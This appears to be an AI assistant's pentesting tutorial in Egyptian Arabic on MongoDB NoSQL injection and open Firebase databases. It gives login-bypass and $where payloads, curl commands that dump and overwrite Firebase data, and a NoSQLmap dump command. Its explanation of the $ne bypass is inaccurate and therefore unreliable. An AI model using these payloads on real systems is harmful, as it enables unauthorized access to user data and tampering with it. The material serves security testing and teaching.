تمام، هنشرح استغلالات **MongoDB** و**Firebase** بعمق عملي مع أكواد وتفاصيل، وهنركز على الجوانب اللي تهمك كـ pentester. هقسم الموضوع لجزئين (MongoDB وFirebase)، وبعد كل جزء هحط خلاصة طريفة بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال. يلا نبدأ!

---

### **1. MongoDB (NoSQL Injection)**
#### **إيه هو؟**
MongoDB هي قاعدة بيانات NoSQL، بتعتمد على صيغة JSON/BSON بدل الجداول التقليدية زي SQL. لو المطور معملش فلترة كويسة للمدخلات، ممكن تحقن كود يغير منطق الاستعلام ويطلعلك بيانات أو يخرب النظام.

#### **ازاي بيشتغل؟**
الموقع بياخد مدخلاتك (زي يوزر نيم وباسوورد) ويحطها في استعلام MongoDB. لو قدرت تحط تعبيرات زي `$ne` (غير مساوي) أو `$gt` (أكبر من)، تقدر تتخطى الشروط أو تسحب بيانات.

#### **مثال عملي:**
- **تخطي اللوجين:**
  لنفترض عندك فورم لوجين، والاستعلام في الباك إند كده:
  ```javascript
  db.users.find({ username: "admin", password: "12345" });
  ```
  لو حطيت في حقل اليوزر نيم: `admin` وفي الباسوورد:
  ```
  {"$ne": "wrong"}
  ```
  الطلب بيبقى:
  ```javascript
  db.users.find({ username: "admin", password: {"$ne": "wrong"} });
  ```
  معناه "جيب اليوزر admin طالما الباسوورد مش wrong"، يعني أي باسوورد صح هيدخلك.

- **سحب بيانات:**
  لو في حقل بحث، حط:
  ```
  {"$where": "this.username == 'admin'"}
  ```
  لو رد الموقع ببيانات، يبقى تقدر تلعب أكتر.

- **اختبار Blind:**
  حط في الباسوورد:
  ```
  {"$gt": ""}
  ```
  الاستعلام هيبقى:
  ```javascript
  db.users.find({ username: "admin", password: {"$gt": ""} });
  ```
  لو دخلت، يبقى الثغرة شغالة.

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "أنا أحمد وكلمة السر مش غلط"، لو قالك "اتفضل ادخل" من غير ما يسألك عن الكلمة، يبقى الباب مفتوح لكل الناس!

---

### **2. Firebase (Realtime Database & Firestore Exploits)**
#### **إيه هو؟**
Firebase هي خدمة من جوجل لتخزين البيانات (Realtime Database أو Firestore)، بتستخدم كتير في تطبيقات الموبايل والويب. لو القواعد (Rules) مش مضبوطة، ممكن توصل لبيانات المستخدمين أو تعدلها.

#### **ازاي بيحصل؟**
Firebase بتعتمد على قواعد أمان (Security Rules). لو المطور سابها مفتوحة (`read: true` أو `write: true`) أو معتمد على مدخلات من غير فلترة، تقدر تستغلها.

#### **مثال عملي:**
- **اكتشاف قاعدة مفتوحة:**
  لو عندك لينك Firebase زي:
  ```
  https://example.firebaseio.com/.json
  ```
  افتحه في المتصفح أو بـ curl:
  ```
  curl -X GET "https://example.firebaseio.com/.json"
  ```
  لو رجعلك بيانات زي:
  ```json
  {"users": {"user1": {"email": "user1@example.com", "password": "123"}}}
  ```
  يبقى القاعدة مفتوحة وتقدر تسحب كل حاجة.

- **تعديل البيانات:**
  لو `write: true`، استخدم PUT:
  ```
  curl -X PUT -d '{"email": "hacked@example.com"}' "https://example.firebaseio.com/users/user1.json"
  ```
  هيغير بيانات اليوزر.

- **استغلال عبر مدخلات:**
  لو التطبيق بياخد إدخال زي `user_id` ويستعلم بيه:
  ```
  https://example.firebaseio.com/users.json?orderBy="user_id"&equalTo="1"
  ```
  جرب تحقن:
  ```
  https://example.firebaseio.com/users.json?orderBy="$key"&equalTo="admin"
  ```
  لو رجعلك بيانات الـ admin، يبقى في ثغرة.

#### **خلاصة طريفة:**
تخيل إنك بتدخل مخزن بتاع صاحبك وتلاقي الباب مفتوح والكاشير بيقولك "خد اللي عايزه وعدل اللي عايزه"، كده بقى المخزن كله تحت إيدك!

---

### **خطوات عملية للاستغلال كـ Pentester**

#### **MongoDB:**
1. **اختبار الثغرة:**
   - في فورم لوجين، جرب في الباسوورد:
     ```
     {"$ne": "wrong"}
     ```
     لو دخلت، يبقى في NoSQL Injection.

2. **تأكيد Blind:**
   - استخدم:
     ```
     {"$gt": ""}
     ```
     لو نجح، ابدأ سحب البيانات.

3. **سحب بيانات (Manual):**
   - جرب:
     ```
     {"$where": "this.username == 'admin' && this.password.length > 0"}
     ```
     وعدل الشرط عشان تستنتج الباسوورد.

4. **استخدام NoSQLmap:**
   ```
   nosqlmap -u "http://example.com/login.php?username=admin&password=test" --dump
   ```
   هيسحب البيانات لو الثغرة موجودة.

#### **Firebase:**
1. **اكتشاف قاعدة مفتوحة:**
   - جرب افتح:
     ```
     https://example.firebaseio.com/.json
     ```
     لو رجع بيانات، دوّنها.

2. **اختبار القواعد:**
   - استخدم GET:
     ```
     curl -X GET "https://example.firebaseio.com/users.json"
     ```
     لو ظهرت بيانات، يبقى `read: true`.

3. **تجربة الكتابة:**
   - جرب PUT:
     ```
     curl -X PUT -d '{"test": "hacked"}' "https://example.firebaseio.com/test.json"
     ```
     لو نجحت، يبقى `write: true`.

4. **استغلال الاستعلامات:**
   - لو في باراميتر زي `user_id`، جرب:
     ```
     https://example.firebaseio.com/users.json?orderBy="$key"&equalTo="admin"
     ```
     وشوف الرد.

#### **نصيحة:**
- لـ MongoDB، استخدم أدوات زي NoSQLmap لو عايز تسرع.
- لـ Firebase، ابحث عن الـ URL في كود التطبيق (APK أو JS) باستخدام أدوات زي apktool أو Burp Suite.

---

ها، عايز أشرح حاجة زيادة زي ازاي تستخرج Firebase URL أو أعمق في NoSQLmap؟